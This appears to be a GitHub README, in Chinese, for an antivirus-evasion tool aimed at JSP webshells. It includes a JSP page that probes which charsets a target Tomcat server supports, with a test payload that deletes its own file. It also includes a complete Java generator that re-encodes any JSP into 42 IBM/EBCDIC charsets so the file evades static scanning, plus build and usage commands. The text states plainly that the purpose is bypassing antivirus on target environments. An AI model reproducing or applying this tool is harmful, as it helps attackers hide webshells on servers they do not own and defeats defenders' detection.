# jsp_charset_analyzer
JSP Charset Analyzer JSP字符集支持分析
> 有的目标环境有杀软，静态都不能过谈何动态，先过了静态再说！
> 此脚本方便获得目标环境支持的所有编码字符集，然后针对性的进行组合，从而达到 Bypass AV 的效果。

# 获取目标环境支持字符集列表

新建一个jsp页面

```java
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page isELIgnored="true" %> <%-- Good practice to avoid EL conflicts --%>
<%@ page import="java.nio.charset.Charset" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.SortedMap" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.util.LinkedHashMap" %>
<!DOCTYPE html>
<html>
<head>
    <title>JSP 字符集支持分析</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 20px; background-color: #f9f9f9; color: #333; }
        h1, h3 { color: #1a1a1a; }
        table { border-collapse: collapse; width: 100%; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; font-family: 'Menlo', 'Courier New', Courier, monospace; }
        th { background-color: #f2f2f2; cursor: pointer; user-select: none; position: relative; }
        th:hover { background-color: #e8e8e8; }
        .sort-arrow { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); color: #888; font-size: 12px; }
        .payload { background-color: #eef; padding: 10px; border-left: 5px solid #66f; margin-bottom: 20px; word-wrap: break-word; font-family: 'Menlo', 'Courier New', Courier, monospace; }
        .problematic { background-color: #ffdddd !important; }
        .clean { background-color: #ddffdd !important; }
        .controls { margin-bottom: 20px; }
        .controls button { background-color: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-right: 10px; }
        .controls button:hover { background-color: #0056b3; }
        .controls button.secondary { background-color: #c82333; }
        .controls button.secondary:hover { background-color: #a21b29; }
        td:first-child { word-break: break-word; } /* Allow long lists of charsets to wrap */
    </style>
</head>
<body>

    <h1>JSP 编码字符集支持分析</h1>
    <p><b>新功能：</b>如果多个字符集产生完全相同的编码字节，它们将被合并到同一行中进行展示。</p>
    <p><b>功能：</b>动态排序（点击表头）和导出为CSV文件。</p>
    
    <h3>测试载荷 (Payload):</h3>
    <div class="payload"><%
        String payload = "<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%" + ">";
        out.print(payload.replace("<", "&lt;").replace(">", "&gt;"));
    %></div>

    <div class="controls">
        <button onclick="exportToCSV('all_charsets_grouped.csv', false)">导出所有为 CSV</button>
        <button onclick="exportToCSV('problematic_charsets_grouped.csv', true)" class="secondary">仅导出有问题项为 CSV</button>
    </div>

    <table id="charsetTable">
        <thead>
            <tr>
                <th onclick="sortTable(0)">字符集名称 (合并显示) <span class="sort-arrow"></span></th>
                <th onclick="sortTable(1)">是否有问题? <span class="sort-arrow"></span></th>
                <th>编码后的字节 (Hex Representation)</th>
            </tr>
        </thead>
        <tbody>
        <%
            // =========================================================================
            //  START OF MODIFIED LOGIC
            // =========================================================================

            // Step 1: Group charsets by their resulting byte sequence.
            // We use LinkedHashMap to maintain a somewhat predictable insertion order.
            Map<String, List<String>> groupedCharsets = new LinkedHashMap<>();
            Map<String, Boolean> problematicFlags = new LinkedHashMap<>();

            SortedMap<String, Charset> availableCharsets = Charset.availableCharsets();
            for (Map.Entry<String, Charset> entry : availableCharsets.entrySet()) {
                String charsetName = entry.getKey();
                String hexString = "";
                boolean isProblematic = false;
                try {
                    byte[] encodedBytes = payload.getBytes(charsetName);
                    StringBuilder sb = new StringBuilder();
                    for (byte b : encodedBytes) {
                        if (b < 32 || b > 126) {
                            isProblematic = true;
                        }
                        sb.append(String.format("%02X ", b));
                    }
                    hexString = sb.toString().trim();
                } catch (Exception e) {
                    hexString = "Encoding Error: " + e.getMessage();
                    isProblematic = true;
                }

                // Add the charset name to the list for this specific hex output.
                groupedCharsets.computeIfAbsent(hexString, k -> new ArrayList<>()).add(charsetName);
                
                // Store the problematic status for this group (only needs to be set once).
                problematicFlags.putIfAbsent(hexString, isProblematic);
            }

            // Step 2: Render the grouped results into the table.
            for (Map.Entry<String, List<String>> groupEntry : groupedCharsets.entrySet()) {
                String hexString = groupEntry.getKey();
                List<String> charsetsInGroup = groupEntry.getValue();
                boolean isProblematic = problematicFlags.get(hexString);

                // Join the list of charset names with a comma for display.
                String combinedCharsetNames = String.join(", ", charsetsInGroup);
                String rowClass = isProblematic ? "problematic" : "clean";
        %>
            <tr class="<%= rowClass %>">
                <td><%= combinedCharsetNames %></td>
                <td><%= isProblematic ? "是" : "否" %></td>
                <td><%= hexString %></td>
            </tr>
        <%
            } // End of the rendering loop
            // =========================================================================
            //  END OF MODIFIED LOGIC
            // =========================================================================
        %>
        </tbody>
    </table>

<script>
    // --- NO CHANGES NEEDED FOR JAVASCRIPT ---
    // The sorting and exporting functions work on the final rendered HTML table.

    // --- 排序功能 ---
    let sortDirection = {}; 
    function sortTable(columnIndex) {
        const table = document.getElementById("charsetTable");
        const tbody = table.tBodies[0];
        const rows = Array.from(tbody.rows);
        const headers = table.tHead.rows[0].cells;
        const direction = sortDirection[columnIndex] === 'asc' ? 'desc' : 'asc';
        sortDirection = { [columnIndex]: direction };
        for (let i = 0; i < headers.length; i++) {
            const arrow = headers[i].querySelector('.sort-arrow');
            if (arrow) {
                if (i === columnIndex) {
                    arrow.textContent = direction === 'asc' ? ' ▲' : ' ▼';
                } else {
                    arrow.textContent = '';
                }
            }
        }
        rows.sort((a, b) => {
            const cellA = a.cells[columnIndex].innerText.toLowerCase();
            const cellB = b.cells[columnIndex].innerText.toLowerCase();
            if (cellA < cellB) return direction === 'asc' ? -1 : 1;
            if (cellA > cellB) return direction === 'asc' ? 1 : -1;
            return 0;
        });
        tbody.innerHTML = '';
        rows.forEach(row => tbody.appendChild(row));
    }

    // --- 导出CSV功能 ---
    function exportToCSV(filename, problematicOnly) {
        const table = document.getElementById("charsetTable");
        let csv = [];
        const headers = Array.from(table.tHead.rows[0].cells).map(header => `"${header.innerText.replace(/"/g, '""').trim()}"`);
        csv.push(headers.join(','));
        const rows = table.tBodies[0].rows;
        for (let i = 0; i < rows.length; i++) {
            const row = rows[i];
            if (problematicOnly && !row.classList.contains('problematic')) {
                continue;
            }
            const rowData = Array.from(row.cells).map(cell => `"${cell.innerText.replace(/"/g, '""')}"`);
            csv.push(rowData.join(','));
        }
        const csvContent = csv.join('\n');
        const blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement("a");
        if (link.download !== undefined) {
            const url = URL.createObjectURL(blob);
            link.setAttribute("href", url);
            link.setAttribute("download", filename);
            link.style.visibility = 'hidden';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    }
</script>

</body>
</html>

```

放到 Tomcat 目录下，浏览器访问即可得到当前jdk下jsp支持的字符集

<img width="3308" height="1764" alt="image" src="https://github.com/user-attachments/assets/82b2dc77-0500-409e-9e4b-3d0211588504" />

可以根据结果进行排序互尊导出结果。
结果显示支持的字符集中，可以用来编码绕过AV静态扫描的字符集如下

```
"IBM-Thai","IBM01140","IBM01141","IBM01142","IBM01143",
"IBM01144","IBM01145","IBM01146","IBM01147","IBM01148",
"IBM01149","IBM037","IBM1026","IBM1047","IBM273","IBM277",
"IBM278","IBM280","IBM284","IBM285","IBM297","IBM420","IBM424","IBM500",
"IBM870","IBM871","IBM918","x-IBM1025","x-IBM1097","x-IBM1112","x-IBM1122","x-IBM1123",
"x-IBM1166","x-IBM1364","x-IBM833","x-IBM875","x-IBM933","x-IBM935","x-IBM937","x-IBM939","IBM290","x-IBM930"
```

当然，其中一部分字符集编码后的结果是一样的。

# jar 生成指定编码字符集jsp文件

批量生成指定字符集或全部设定字符集jsp文件实现Java代码如下
```java
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.charset.UnsupportedCharsetException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;

public class GenerateCp290Jsp {
    // 定义所有支持的编码列表
    private static final String[] SUPPORTED_ENCODINGS = {
        "IBM-Thai","IBM01140","IBM01141","IBM01142","IBM01143",
        "IBM01144","IBM01145","IBM01146","IBM01147","IBM01148",
        "IBM01149","IBM037","IBM1026","IBM1047","IBM273","IBM277",
        "IBM278","IBM280","IBM284","IBM285","IBM297","IBM420","IBM424","IBM500",
        "IBM870","IBM871","IBM918","x-IBM1025","x-IBM1097","x-IBM1112","x-IBM1122","x-IBM1123",
        "x-IBM1166","x-IBM1364","x-IBM833","x-IBM875","x-IBM933","x-IBM935","x-IBM937","x-IBM939","IBM290","x-IBM930"
    };

    public static void main(String[] args) {
        boolean allMode = false;
        if (args.length < 1) {
            printUsage();
            System.exit(1);
        }

        String inputFile = args[0];
        String outputFile = null;
        String inputEncoding = StandardCharsets.UTF_8.name();
        String outputEncoding = "cp290";
        boolean outputHex = false;
        boolean outputBase64 = false;

        // 解析命令行参数
        for (int i = 1; i < args.length; i++) {
            if (args[i].equalsIgnoreCase("-all")) {
                allMode = true;
            } else if (args[i].equalsIgnoreCase("-ie") && i + 1 < args.length) {
                inputEncoding = args[++i];
            } else if (args[i].equalsIgnoreCase("-oe") && i + 1 < args.length) {
                outputEncoding = args[++i];
            } else if (args[i].equalsIgnoreCase("-o") && i + 1 < args.length) {
                outputFile = args[++i];
            } else if (args[i].equalsIgnoreCase("-hex")) {
                outputHex = true;
            } else if (args[i].equalsIgnoreCase("-base64")) {
                outputBase64 = true;
            } else {
                System.err.println("警告: 忽略未知参数: " + args[i]);
            }
        }

        // 如果启用了 -all 模式
        if (allMode) {
            System.out.println("启用全编码模式，将生成所有支持的编码版本");
            System.out.println("支持的编码数量: " + SUPPORTED_ENCODINGS.length);
            
            String baseOutputPath = outputFile;
            if (baseOutputPath != null) {
                // 如果指定了输出路径，检查是否是目录
                Path outputPath = Paths.get(baseOutputPath);
                if (!Files.isDirectory(outputPath) && !baseOutputPath.endsWith(File.separator)) {
                    // 如果指定的是文件路径，则使用其父目录
                    baseOutputPath = (outputPath.getParent() != null) ? 
                        outputPath.getParent().toString() : "";
                }
            }
            
            for (String enc : SUPPORTED_ENCODINGS) {
                try {
                    // 为每个编码生成输出文件名
                    String encOutputFile;
                    if (baseOutputPath == null) {
                        encOutputFile = generateOutputFileName(inputFile, enc);
                    } else {
                        String fileName = Paths.get(generateOutputFileName(inputFile, enc)).getFileName().toString();
                        encOutputFile = Paths.get(baseOutputPath, fileName).toString();
                    }
                    
                    // 转换并写入文件
                    convertAndWriteFile(
                        inputFile, 
                        inputEncoding, 
                        enc, 
                        encOutputFile, 
                        outputHex, 
                        outputBase64
                    );
                    
                    System.out.println("成功生成: " + enc);
                } catch (Exception e) {
                    System.err.println("编码 " + enc + " 处理失败: " + e.getMessage());
                }
            }
            
            System.out.println("全编码模式完成，共尝试生成 " + SUPPORTED_ENCODINGS.length + " 个文件");
        } else {
            // 单编码模式（原始逻辑）
            try {
                convertAndWriteFile(
                    inputFile, 
                    inputEncoding, 
                    outputEncoding, 
                    outputFile, 
                    outputHex, 
                    outputBase64
                );
            } catch (UnsupportedCharsetException e) {
                System.err.println("错误: 不支持的编码 - " + e.getCharsetName());
                System.err.println("请确认您的JVM支持此编码");
            } catch (IOException e) {
                System.err.println("处理文件时发生错误: " + e.getMessage());
                e.printStackTrace();
            }
        }
    }

    // 文件转换逻辑
    private static void convertAndWriteFile(
        String inputFile, 
        String inputEncoding, 
        String outputEncoding, 
        String outputFile, 
        boolean outputHex, 
        boolean outputBase64
    ) throws IOException {
        // 自动生成输出文件名（如果需要）
        if (outputFile == null) {
            outputFile = generateOutputFileName(inputFile, outputEncoding);
        } else {
            // 检查输出路径是否是目录
            Path outputPath = Paths.get(outputFile);
            if (Files.isDirectory(outputPath) || outputFile.endsWith(File.separator)) {
                // 如果输出路径是目录或结尾有分隔符，生成文件名并添加到路径中
                String fileName = Paths.get(generateOutputFileName(inputFile, outputEncoding)).getFileName().toString();
                outputFile = outputPath.resolve(fileName).toString();
            }
        }

        System.out.println("正在读取文件: " + inputFile + " (输入编码: " + inputEncoding + ")");
        byte[] fileContent = Files.readAllBytes(Paths.get(inputFile));
        
        // 添加JSP编码指令（使用ASCII编码）
        String jspDirective = "<%@ page pageEncoding=\"" + outputEncoding + "\"%>\n";
        byte[] directiveBytes = jspDirective.getBytes(StandardCharsets.US_ASCII);
        
        // 转换文件内容到目标编码
        String content = new String(fileContent, Charset.forName(inputEncoding));
        byte[] contentBytes;
        try {
            contentBytes = content.getBytes(Charset.forName(outputEncoding));
        } catch (UnsupportedCharsetException e) {
            System.err.println("错误: 不支持的输出编码 - " + outputEncoding);
            throw e;
        }
        
        // 合并指令和内容
        byte[] finalBytes = new byte[directiveBytes.length + contentBytes.length];
        System.arraycopy(directiveBytes, 0, finalBytes, 0, directiveBytes.length);
        System.arraycopy(contentBytes, 0, finalBytes, directiveBytes.length, contentBytes.length);
        
        // 确保输出文件的父目录存在
        Path finalPath = Paths.get(outputFile);
        if (finalPath.getParent() != null) {
            Files.createDirectories(finalPath.getParent());
        }
        
        // 写入主要输出文件
        System.out.println("正在写入文件: " + outputFile + " (输出编码: " + outputEncoding + ")");
        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
            fos.write(finalBytes);
            System.out.println("文件转换成功!");
            System.out.println("输入文件: " + inputFile + " (" + inputEncoding + ")");
            System.out.println("输出文件: " + outputFile + " (" + outputEncoding + ")");
            System.out.println("已添加JSP编码指令: " + jspDirective.trim());
        }
        
        // 如果需要，生成十六进制编码文件
        if (outputHex) {
            String hexFile = outputFile + ".hex";
            writeHexFile(hexFile, finalBytes);
            System.out.println("已生成十六进制编码文件: " + hexFile);
        }
        
        // 如果需要，生成Base64编码文件
        if (outputBase64) {
            String base64File = outputFile + ".base64";
            writeBase64File(base64File, finalBytes);
            System.out.println("已生成Base64编码文件: " + base64File);
        }
    }

    // 生成十六进制编码文件
    private static void writeHexFile(String filename, byte[] data) throws IOException {
        StringBuilder hex = new StringBuilder(data.length * 2);
        for (byte b : data) {
            hex.append(String.format("%02X", b));
        }
        Files.write(Paths.get(filename), hex.toString().getBytes(StandardCharsets.UTF_8));
    }

    // 生成Base64编码文件
    private static void writeBase64File(String filename, byte[] data) throws IOException {
        String base64 = Base64.getEncoder().encodeToString(data);
        Files.write(Paths.get(filename), base64.getBytes(StandardCharsets.UTF_8));
    }

    // 生成输出文件名：输入文件名_输出编码_时间戳
    private static String generateOutputFileName(String inputFile, String outputEncoding) {
        Path path = Paths.get(inputFile);
        String fileName = path.getFileName().toString();
        
        int dotIndex = fileName.lastIndexOf('.');
        String baseName = (dotIndex > 0) ? fileName.substring(0, dotIndex) : fileName;
        String extension = (dotIndex > 0) ? fileName.substring(dotIndex) : "";
        
        String timeStamp = new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
        String newFileName = baseName + "_" + outputEncoding + "_" + timeStamp + extension;
        
        if (path.getParent() != null) {
            return path.getParent().resolve(newFileName).toString();
        }
        return newFileName;
    }

    // 动态获取JAR文件名
    private static String getJarName() {
        try {
            return new File(GenerateCp290Jsp.class
                .getProtectionDomain()
                .getCodeSource()
                .getLocation()
                .toURI())
                .getName();
        } catch (Exception e) {
            return "GenerateCp290Jsp.jar";
        }
    }

    private static void printUsage() {
        String jarName = getJarName();
        
        System.out.println("用法: java -jar " + jarName + " <输入文件> [选项]");
        System.out.println("选项:");
        System.out.println("  -ie <编码>     输入文件编码 (默认: UTF-8)");
        System.out.println("  -oe <编码>     输出文件编码 (默认: cp290)");
        System.out.println("  -o <输出路径>   输出文件或目录路径 (默认: 自动生成)");
        System.out.println("  -hex           额外生成十六进制编码文件");
        System.out.println("  -base64        额外生成Base64编码文件");
        System.out.println("  -all           生成所有支持的编码版本");
        System.out.println("\n支持的编码 (" + SUPPORTED_ENCODINGS.length + " 种):");
        System.out.println("  " + String.join(", ", SUPPORTED_ENCODINGS));
        
        System.out.println("\n示例:");
        System.out.println("  1. 基本用法:");
        System.out.println("     java -jar " + jarName + " input.jsp");
        System.out.println("     输出: input_cp290_20231020123456.jsp");
        
        System.out.println("\n  2. 生成所有编码版本:");
        System.out.println("     java -jar " + jarName + " input.jsp -all");
        System.out.println("     在输入文件同目录下生成多个文件: ");
        System.out.println("        input_cp037_20231020123456.jsp");
        System.out.println("        input_cp290_20231020123456.jsp");
        System.out.println("        ...");
        
        System.out.println("\n  3. 指定输出目录并生成所有编码版本:");
        System.out.println("     java -jar " + jarName + " input.jsp -all -o output/");
        System.out.println("     在output目录下生成多个文件");
        
        System.out.println("\n  4. 生成所有编码版本并附加十六进制和Base64:");
        System.out.println("     java -jar " + jarName + " input.jsp -all -hex -base64");
        System.out.println("     为每个编码版本生成三个文件: .jsp, .hex, .base64");
    }
}

```

然后使用如下命令进行编译成jar包，方便调用

```
javac GenerateCp290Jsp.java && jar cfm GenerateCp290Jsp.jar MANIFEST.MF GenerateCp290Jsp.class
```

使用说明

```
用法: java -jar GenerateCp290Jsp.jar <输入文件> [选项]
选项:
  -ie <编码>     输入文件编码 (默认: UTF-8)
  -oe <编码>     输出文件编码 (默认: cp290)
  -o <输出路径>   输出文件或目录路径 (默认: 自动生成)
  -hex           额外生成十六进制编码文件
  -base64        额外生成Base64编码文件
  -all           生成所有支持的编码版本

支持的编码 (42 种):
  IBM-Thai, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, IBM037, IBM1026, IBM1047, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM500, IBM870, IBM871, IBM918, x-IBM1025, x-IBM1097, x-IBM1112, x-IBM1122, x-IBM1123, x-IBM1166, x-IBM1364, x-IBM833, x-IBM875, x-IBM933, x-IBM935, x-IBM937, x-IBM939, IBM290, x-IBM930

示例:
  1. 基本用法:
     java -jar GenerateCp290Jsp.jar input.jsp
     输出: input_cp290_20231020123456.jsp

  2. 生成所有编码版本:
     java -jar GenerateCp290Jsp.jar input.jsp -all
     在输入文件同目录下生成多个文件: 
        input_cp037_20231020123456.jsp
        input_cp290_20231020123456.jsp
        ...

  3. 指定输出目录并生成所有编码版本:
     java -jar GenerateCp290Jsp.jar input.jsp -all -o output/
     在output目录下生成多个文件

  4. 生成所有编码版本并附加十六进制和Base64:
     java -jar GenerateCp290Jsp.jar input.jsp -all -hex -base64
     为每个编码版本生成三个文件: .jsp, .hex, .base64
```

# 注意

所有代码均为现实牛马鞭策赛博牛马实现！现实牛马不负任何责任哈！
